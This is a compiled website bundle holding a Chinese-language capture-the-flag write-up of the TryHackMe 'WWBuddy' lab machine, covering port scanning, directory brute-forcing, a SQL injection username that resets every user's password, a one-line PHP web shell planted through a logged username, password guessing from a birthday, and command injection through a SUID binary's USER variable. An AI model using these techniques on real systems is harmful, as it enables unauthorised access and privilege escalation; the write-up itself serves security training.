"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[672],{45013:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>d,contentTitle:()=>r,default:()=>u,frontMatter:()=>s,metadata:()=>l,toc:()=>o});var a=t(74848),i=t(28453);const s={sidebar_position:149,tags:["Easy","Linux","SQLI","SUID","\u6587\u4ef6\u5305\u542b"],title:"WWBuddy",description:"WWBuddy",sidebar_label:"WWBuddy",slug:"/tryhackme/149"},r="WWBuddy",l={id:"box/TryHackMe/149",title:"WWBuddy",description:"WWBuddy",source:"@site/docs/box/TryHackMe/149.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/149",permalink:"/docs/tryhackme/149",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"SUID",permalink:"/docs/tags/suid"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"}],version:"current",sidebarPosition:149,frontMatter:{sidebar_position:149,tags:["Easy","Linux","SQLI","SUID","\u6587\u4ef6\u5305\u542b"],title:"WWBuddy",description:"WWBuddy",sidebar_label:"WWBuddy",slug:"/tryhackme/149"},sidebar:"boxSidebar",previous:{title:"toc2",permalink:"/docs/tryhackme/148"},next:{title:"Hamlet",permalink:"/docs/tryhackme/150"}},d={},o=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; roberto",id:"www-data--roberto",level:3},{value:"roberto \u2014&gt; jenny",id:"roberto--jenny",level:3},{value:"jenny \u2014&gt; root",id:"jenny--root",level:3}];function c(n){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.h1,{id:"wwbuddy",children:"WWBuddy"}),"\n",(0,a.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-77-80:~/wwbuddy# nmap -sTCV -p 22,80 --min-rate 1000 10.10.32.243\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-06 01:50 BST\nNmap scan report for ip-10-10-32-243.eu-west-1.compute.internal (10.10.32.243)\nHost is up (0.00011s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 66:75:21:b4:93:4a:a5:a7:df:f4:01:80:19:cf:ff:ad (RSA)\n|   256 a6:dd:30:3b:e4:96:ba:ab:5f:04:3b:9e:9e:92:b7:c0 (ECDSA)\n|_  256 04:22:f0:d2:b0:34:45:d4:e5:4d:ad:a2:7d:cd:00:41 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n| http-title: Login\n|_Requested resource was http://ip-10-10-32-243.eu-west-1.compute.internal/login/\n"})}),"\n",(0,a.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-77-80:~/wwbuddy# gobuster dir -u http://10.10.32.243/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.32.243/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/06 01:50:59 Starting gobuster\n===============================================================\n/images (Status: 301)\n/login (Status: 301)\n/register (Status: 301)\n/profile (Status: 301)\n/index.php (Status: 302)\n/header.html (Status: 200)\n/admin (Status: 301)\n/footer.html (Status: 200)\n/chat.php (Status: 200)\n/js (Status: 301)\n/api (Status: 301)\n/logout.php (Status: 302)\n/config.php (Status: 200)\n/styles (Status: 301)\n/change (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/06 02:03:35 Finished\n===============================================================\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u8bbf\u95ee\u767b\u9646\u9875\u9762, \u5e76\u4e14\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7, \u5728\u6ce8\u518c\u4e4b\u540e\u8fdb\u884c\u767b\u9646, \u6211\u53d1\u73b0\u5176\u4e2d\u7c7b\u4f3c\u4e8e\u804a\u5929\u754c\u9762"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182658.png",alt:"image-20240709182657383"})}),"\n",(0,a.jsx)(e.p,{children:"\u5728\u6b64\u7ecf\u8fc7\u4e00\u4e9b\u5206\u6790\u64cd\u4f5c, \u6211\u8fd8\u4ee5\u4e3a\u662f IDOR \u6f0f\u6d1e, \u56e0\u4e3a\u67e5\u770b\u6e90\u4ee3\u7801\u5c31\u4f1a\u53d1\u73b0\u5176\u4e2d\u6bcf\u4e2a\u7528\u6237\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a uid \u6765\u8fdb\u884c\u64cd\u4f5c, \u4f46\u662f\u53ef\u60dc\u5bf9\u5e94\u7684 uid \u65e0\u6cd5\u7834\u89e3, \u53ea\u80fd\u8f6c\u6362\u601d\u8def, \u6211\u53d1\u73b0\u5b58\u5728\u4fee\u6539\u7528\u6237\u540d\u79f0\u4ee5\u53ca\u4fee\u6539\u7528\u6237\u5bc6\u7801\u7684\u754c\u9762, \u6240\u4ee5\u6211\u5c31\u60f3\u7740\u8054\u52a8\u4e00\u4e0b"}),"\n",(0,a.jsxs)(e.ol,{children:["\n",(0,a.jsx)(e.li,{children:"\u4fee\u6539\u7528\u6237\u540d\u4e3a WWBuddy \u53d1\u73b0\u4e0d\u80fd\u64cd\u4f5c"}),"\n",(0,a.jsxs)(e.li,{children:["\u4fee\u6539\u7528\u6237\u540d\u4e3a ",(0,a.jsx)(e.code,{children:"\u2018or 1=1 \u2014 -"})," \u53d1\u73b0\u53ef\u4ee5\u8fd9\u6837\u505a,  \u4e4b\u540e\u4fee\u6539\u7528\u6237\u7684\u5bc6\u7801, \u5982\u679c\u540e\u7aef\u63aa\u65bd\u505a\u7684\u4e0d\u4e25\u683c\u90a3\u4e48\u5e94\u8be5\u4f1a\u4fee\u6539\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801, \u7ed3\u679c\u5982\u6211\u6240\u6599\u786e\u5b9e\u4fee\u6539\u4e86\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801"]}),"\n"]}),"\n",(0,a.jsx)(e.p,{children:"\u5728\u767b\u9646Henry \u7684\u754c\u9762\u540e, \u6211\u53d1\u73b0\u591a\u4e2a\u51e0\u4e2a\u7528\u6237, \u5176\u4e2d\u5728\u548c Roberto \u7528\u6237\u7684\u804a\u5929\u4e2d\u544a\u8bc9\u6211\u4eec\u670d\u52a1\u7aef\u521b\u5efa\u7684\u8d26\u53f7\u9ed8\u8ba4\u5bc6\u7801\u662f\u5176\u7528\u6237\u7684\u751f\u65e5, \u4f46\u662f\u6211\u4eec\u76ee\u524d\u638c\u63e1\u7684\u7528\u6237\u5176\u5bc6\u7801\u90fd\u5df2\u7ecf\u88ab\u4fee\u6539\u4e86, \u53ea\u80fd\u53e6\u5bfb\u4ed6\u6cd5, \u4e4b\u540e\u6211\u8bbf\u95ee admin \u754c\u9762\u53d1\u73b0\u5176\u662f\u4e00\u4e2a\u8bbf\u95ee\u62e6\u622a\u8bb0\u5f55\u754c\u9762, \u4f1a\u8bb0\u5f55\u7528\u6237\u540d\u79f0, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u7528\u6237\u7684\u540d\u79f0\u6539\u4e3a PHP\u4e00\u53e5\u8bdd\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182704.png",alt:"image-20240709182703236"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-php",children:"<?php system($_GET['cmd']); ?>\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u4fee\u6539\u4e4b\u540e\u6211\u518d\u6b21\u67e5\u770b\u9875\u9762\u5e76\u8fdb\u884c\u4f20\u53c2\u53d1\u73b0\u53ef\u4ee5\u6267\u884c"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182713.png",alt:"image-20240709182712229"})}),"\n",(0,a.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,a.jsx)(e.p,{children:"\u5229\u7528\u4e0a\u9762\u53d1\u73b0\u7684\u6587\u4ef6\u5305\u542b\u6765\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u4ece\u800c\u83b7\u53d6 Shell"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182727.png",alt:"image-20240709182726404"})}),"\n",(0,a.jsx)(e.h3,{id:"www-data--roberto",children:"www-data \u2014> roberto"}),"\n",(0,a.jsx)(e.p,{children:"\u4f7f\u7528 Linpeas \u8fdb\u884c\u679a\u4e3e\u5728\u5176\u672b\u5c3e\u53d1\u73b0\u4e00\u4e2a\u5bc6\u7801\u6cc4\u9732"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182734.png",alt:"image-20240709182733275"})}),"\n",(0,a.jsx)(e.p,{children:"\u7ecf\u8fc7\u9a8c\u8bc1\u8fd9\u5c31\u662f\u6211\u4eec\u7684 roberto \u7528\u6237\u7684\u5bc6\u7801"}),"\n",(0,a.jsx)(e.h3,{id:"roberto--jenny",children:"roberto \u2014> jenny"}),"\n",(0,a.jsxs)(e.p,{children:["\u5728\u7528\u6237 roberto \u7684\u5bb6\u76ee\u5f55\u8fdb\u884c\u679a\u4e3e\u65f6\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6, \u5176\u4e2d\u544a\u8bc9\u6211\u4eec jenny \u5728\u4e0b\u5468\u5c31\u662f 26 \u5c81\u751f\u65e5, \u7ed3\u5408\u6211\u4eec\u4e4b\u524d\u7684\u4fe1\u606f, \u7528\u6237\u7684\u9ed8\u8ba4\u5bc6\u7801\u662f\u5176\u751f\u65e5, \u57fa\u4e8e\u521b\u5efa\u6b64\u6587\u4ef6\u7684\u521b\u5efa\u65e5\u671f\u6211\u5c31\u5f00\u59cb\u4e86\u9006\u63a8, \u6700\u7ec8\u5f97\u5230\u5176\u751f\u65e5\u4e3a ",(0,a.jsx)(e.code,{children:"08/03/1994"})]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182745.png",alt:"image-20240709182743860"})}),"\n",(0,a.jsx)(e.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u751f\u65e5\u4f5c\u4e3a\u7528\u6237 jenny \u7684\u5bc6\u7801\u8fdb\u884c\u767b\u9646\u53d1\u73b0\u53ef\u4ee5"}),"\n",(0,a.jsx)(e.h3,{id:"jenny--root",children:"jenny \u2014> root"}),"\n",(0,a.jsx)(e.p,{children:"\u5728\u4e4b\u524d\u8fdb\u884c linpeas.sh \u679a\u4e3e\u65f6\u6211\u4eec\u5c31\u4f1a\u53d1\u73b0\u4e00\u4e2a\u672a\u77e5\u7684 SUID \u7a0b\u5e8f"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182803.png",alt:"image-20240709182801766"})}),"\n",(0,a.jsx)(e.p,{children:"\u5982\u679c\u4f60\u5c1d\u8bd5\u6267\u884c\u4f60\u4f1a\u53d1\u73b0\u7528\u6237 jenny \u7684\u5f53\u524d\u7528\u6237\u7ec4\u53d1\u751f\u4e86\u53d8\u5316, \u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u9006\u5411\u5206\u6790 , \u5f97\u5230\u5982\u4e0b\u6e90\u4ee3\u7801"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-c",children:'undefined8 main(void){\n  __uid_t __uid;\n  int iVar1;\n  char *__src;\n  long in_FS_OFFSET;\n  undefined8 local_48;\n  undefined8 local_40;\n  undefined8 local_38;\n  undefined8 local_30;\n  undefined8 local_28;\n  undefined4 local_20;\n  undefined local_1c;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  __uid = getuid();\n  if ((int)__uid < 1000) {  # \u68c0\u67e5\u5f53\u524d\u7528\u6237\u7684 uid \u662f\u5426\u5927\u4e8e 1000\n    puts("You need to be a real user to be authenticated.");\n  }\n  else {\n    iVar1 = system("groups | grep developer");\n    if (iVar1 == 0) {\n      puts("You are already a developer.");\n    }\n    else {\n      __src = getenv("USER"); # \u83b7\u53d6\u73af\u5883\u53d8\u91cf USER \u7684\u503c\n      __uid = getuid();\n      setuid(0);\n      local_48 = 0x20646f6d72657375;\n      local_40 = 0x6c6576656420472d;\n      local_38 = 0x207265706f;\n      local_30 = 0;\n      local_28 = 0;\n      local_20 = 0;\n      local_1c = 0;\n      strncat((char *)&local_48,__src,0x14); # \u5b83\u5c06\u4ece __src \u6307\u5411\u7684\u6e90\u5b57\u7b26\u4e32\u4e2d\u5c06\u6700\u591a 20 \u4e2a\u5b57\u7b26\u8fde\u63a5\u5230 local_48 \u53d8\u91cf\u6240\u6307\u5411\u7684\u4f4d\u7f6e\n      system((char *)&local_48); # \u6267\u884c\u547d\u4ee4\n      puts("Group updated");\n      setuid(__uid);\n      system("newgrp developer");\n    }\n  }\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return 0;\n}\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u7ecf\u8fc7\u5206\u6790\u6211\u5f97\u51fa\u5982\u4e0b\u7ed3\u8bba:"}),"\n",(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:"\u7528\u6237\u7684 uid > 1000"}),"\n",(0,a.jsx)(e.li,{children:"\u4ece\u73af\u5883\u53d8\u91cf\u4e2d\u83b7\u53d6\u7684 USER , \u957f\u5ea6\u9650\u5236 20 \u5b57\u7b26"}),"\n"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-182809.png",alt:"image-20240709182808407"})})]})}function u(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(c,{...n})}):c(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>r,x:()=>l});var a=t(96540);const i={},s=a.createContext(i);function r(n){const e=a.useContext(s);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:r(n.components),a.createElement(s.Provider,{value:e},n.children)}}}]);